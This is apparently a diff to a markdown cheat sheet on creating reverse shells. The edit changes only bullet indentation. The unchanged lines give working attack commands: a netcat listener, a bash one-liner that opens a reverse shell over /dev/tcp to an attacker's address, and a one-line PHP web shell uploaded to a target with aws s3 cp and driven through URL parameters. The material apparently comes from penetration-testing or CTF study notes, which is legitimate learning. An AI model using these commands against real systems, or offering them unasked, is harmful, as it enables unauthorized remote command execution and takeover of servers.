@@ -8,16 +8,16 @@ How to create a reverse shell through bash/Linux terminal commands
 Reverse shells are often used for gaining remote access to a system. Reverse shells require a listener on your attacking machine, and then you need to execute a command on the target machine that connects back to your listener, granting you access to the target machine's shell.
 ### How to create a reverse shell using ```bash```
 1. ```nc -lvnp 4444```: use ```netcat``` to create a listener on port ```4444```
-    a. Other port numbers can be used as well, select the number that works for you 
+- Other port numbers can be used as well, select the number that works for you 
 2. ```bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1```: use ```bash``` to start an interactive shell
 ### How to create a reverse shell using ```aws``` and ```php```
 1. ```nano shell.php```
-        - Use the code editor to write a piece of code in PHP, such as: ```<? php system($_GET['cmd']); ?>```
+   - Use the code editor to write a piece of code in PHP, such as: ```<? php system($_GET['cmd']); ?>```
 2. ```cat shell.php```: check for ```shell.php```
 3. ```aws s3 cp --endpoint-url=http://<target_url> shell.php s3://<target_url_w/o_extensions>```: upload ```shell.php``` to target
 4. go to web browser, enter URL ```http://<target_url>/shell.php?cmd=ls```: execute ```ls``` command in web browser
-        - You should now have access to the target website and can execute ```bash``` commands through the URL.
-        - Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.
+- You should now have access to the target website and can execute ```bash``` commands through the URL.
+- Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.
 
 
 # Upgrade your shell
